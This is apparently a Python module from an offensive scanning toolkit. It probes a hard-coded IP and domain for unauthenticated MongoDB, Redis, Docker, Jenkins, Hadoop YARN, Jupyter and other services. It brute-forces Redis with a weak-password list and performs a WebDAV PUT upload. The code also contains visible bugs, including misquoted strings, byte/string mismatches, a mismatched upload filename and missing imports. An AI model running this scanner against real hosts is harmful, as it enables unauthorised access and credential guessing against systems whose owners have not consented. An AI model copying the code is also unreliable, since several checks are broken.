# coding:utf-8

from Exploit.BaseExploit import *
import http.client
import socket
import time
import pymongo
import requests
from threading import Thread
requests.packages.urllib3.disable_warnings()

TIMEOUT = 3
socket.setdefaulttimeout(TIMEOUT)


class IpUnauth(Exploit):
    def __init__(self, domain, ip):
        super().__init__()
        self.user_list = ['root', 'sa', 'system', 'Administrtor', 'ubuntu']
        self.password_list = ['root', 'sa', 'admin', 'test', 'mysql', '123456', 'admin1234', 'admin12345', '000000', '987654321', '1234', '12345']
        self.headers = {"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"}
        self._ip = ip
        self.domain = domain
        self.ipunauthlist = list() # 存储存在未授权的ip

    def write_file(self, web_lists, target, page):
        workbook = openpyxl.load_workbook(os.getcwd() + os.path.sep + str(target) + ".xlsx")
        worksheet = workbook.worksheets[page]  # 打开的是证书的sheet
        worksheet.append(web_lists)
        workbook.save(os.getcwd() + os.path.sep + str(target) + ".xlsx")
        workbook.close()

    def exploit(self):
        '''Mongodb数据库未授权访问漏洞'''
        try:
            conn = pymongo.MongoClient(str(self._ip), 27017)
            dbname = conn.list_database_names()
            if dbname:
                self.ipunauthlist.append("Mongodb数据库未授权访问漏洞 : ' + str(ip) + ':27017'")
        except:
            pass
        finally:
            conn.close()

        '''Mongodb数据库未授权访问漏洞'''
        try:
            conn = pymongo.MongoClient(str(self._ip), 27018)
            dbname = conn.list_database_names()
            if dbname:
                self.ipunauthlist.append("Mongodb数据库未授权访问漏洞 : ' + str(ip) + ':27017'")

        except:
            pass
        finally:
            conn.close()

        '''Redis未授权'''
        try:
            s = socket.socket()
            s.connect((str(self._ip), 6379))
            s.send(b"INFO\r\n")
            result = s.recv(1024)
            if b"redis_version" in result:
                self.ipunauthlist.append('Redis数据库未授权访问漏洞 : ' + str(self._ip) + ':6379')
        except:
            pass
        finally:
            s.close()

        '''Redis弱口令漏洞'''
        try:
            s = socket.socket()
            s.connect((self._ip, int(6379)))
            s.send(b"INFO\r\n")
            result = s.recv(1024)
            if b"Authentication" in result:
                for _pass in self.password_list:
                    s = socket.socket()
                    s.connect((self._ip, int(6379)))
                    s.send("AUTH %s\r\n" % _pass)
                    result = s.recv(1024)
                    if '+OK' in result:
                        self.ipunauthlist.append('Redis弱口令漏洞 : ' + str(self._ip) + ':6379|' + str(_pass))
        except:
            pass
        finally:
            s.close()

        '''ZooKeeper未授权访问漏洞'''
        try:
            s = socket.socket()
            s.connect((str(self._ip), 2181))
            s.send(b"envi")
            result = s.recv(1024)
            if b"zookeeper.version" in result:
                self.ipunauthlist.append('ZooKeeper未授权访问漏洞 : ' + str(self._ip) + ':2181')
        except:
            pass
        finally:
            s.close()

        '''Elasticsearch未授权访问漏洞'''
        try:
            conn = http.client.HTTPConnection(str(self._ip), 9200, True)
            conn.request("GET", '/_cat/master')
            resp = conn.getresponse()
            if resp.status == 200:
                self.ipunauthlist.append('Elasticsearch未授权访问漏洞 : ' + str(self._ip) + ':9200')
        except:
            pass
        finally:
            s.close()

        '''Memcache未授权访问漏洞'''
        try:
            s = socket.socket()
            s.connect((str(self._ip), 11211))
            s.send(b"stats")
            result = s.recv(1024)
            if b"STAT version" in result:
                self.ipunauthlist.append('Memcache未授权访问漏洞 : ' + str(self._ip) + ':11211')
        except:
            pass
        finally:
            s.close()

        '''iis WebDav未授权，收集的'''
        try:
            s = socket.socket()
            s.connect((self._ip, 80))
            s.send(b"PUT /iisput.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (self._ip, 80))
            time.sleep(1)
            data = s.recv(1024)
            s.close()
            if 'PUT' in data:
                url = 'http://' + self._ip + ":" + str(80) + '/vultest.txt'
                resp = requests.get(url, Verify=False)
                if 'xxscan0' in resp.text:
                    self.ipunauthlist.append('IIS WebDav未授权上传漏洞 : ' + str(url))
        except:
            pass

        finally:
            s.close()

        '''Docker未授权访问漏洞'''
        try:
            conn = http.client.HTTPConnection(str(self._ip), 2375, True)
            conn.request("GET", '/containers/json')
            resp = conn.getresponse()
            if resp.status == 200 and "HostConfig" in resp.read():
                self.ipunauthlist.append('Docker未授权访问漏洞 : ' + str(self._ip) + ':2375/containers/json')
                # with open('result.txt', 'a+')as aaa:
                #     aaa.write('Docker未授权访问漏洞 : ' + str(ip) + ':2375/containers/json' + '\n')
        except:
            pass
        finally:
            conn.close()

        '''CouchDB未授权访问漏洞'''
        try:
            rr = requests.get(url=str('http://' + str(self._ip) + '/_config'), headers=self.headers, timeout=TIMEOUT)
            if "couch" in rr.content:
                self.ipunauthlist.append('CouchDB未授权访问漏洞 : ' + str(rr.url))

                # with open('result.txt', 'a+')as aaa:
                #     aaa.write('CouchDB未授权访问漏洞 : ' + str(rr.url) + '\n')
        except:
            pass

        '''Jenkins未授权访问漏洞'''
        try:
            r_ = []
            r2 = 'http://' + str(self._ip) + '/manage'
            r4 = 'http://' + str(self._ip) + ':8080/manage'
            r_.append(r2)
            r_.append(r4)
            for r_r in r_:
                try:
                    Jenkins_resp = requests.get(url=r_r, headers=self.headers, timeout=TIMEOUT)
                    if 'arbitrary' in Jenkins_resp.content:
                        self.ipunauthlist.append('Jenkins未授权访问漏洞 : ' + str(r_r))
                except:
                    pass
        except:
            pass

        '''Hadoop YARN ResourceManager 未授权访问漏洞'''
        try:
            xxx_ = []
            xxx1 = 'http://' + str(self._ip)
            xxx2 = 'http://' + str(self._ip) + ':8088'
            xxx_.append(xxx1)
            xxx_.append(xxx2)
            for xx in xxx_:
                url = xx + '/ws/v1/cluster/apps/new-application'
                resp = requests.post(url)
                app_id = resp.json()['application-id']
                if app_id:
                    self.ipunauthlist.append("Hadoop未授权访问漏洞 : " + str(self._ip))
        except:
            pass

        '''rsync未授权访问'''
        try:
            s = socket.socket()
            s.connect((str(self._ip), 873))
            s.send(b"@RSYNCD: 31\n")
            s.send(b'\n')
            time.sleep(0.5)
            result = s.recv(1024)
            if result:
                for path_name in re.split('\n', result.decode()):
                    if path_name and not path_name.startswith('@RSYNCD: '):
                        self.ipunauthlist.append("rsync未授权访问 : " + str(self._ip))
        except:
            pass
        finally:
            s.close()

        '''Jupyter Notebook 未授权访问漏洞'''
        try:
            target = 'http://' + str(self._ip) + ':8888'
            url = target + '/tree'
            resp = requests.get(url=url, headers=self.headers)
            if resp.status_code == 200:
                self.ipunauthlist.append("Jupyter Notebook 未授权访问漏洞 : " + str(self._ip))
        except:
            pass

    @property
    def main(self):
        self.exploit()
        self.write_file(self.ipunauthlist, self.domain, 9)


if __name__ == '__main__':
    starttime = time.time()
    list_ = ['172.30.212.58']
    thread_list = []
    for _ in list_:
        xxx = IpUnauth('nbcc.cn', _)
        thread_list.append(Thread(target=xxx.main))
    for i in thread_list:
        i.start()
    for i in thread_list:
        i.join()

    print(time.time() - starttime)
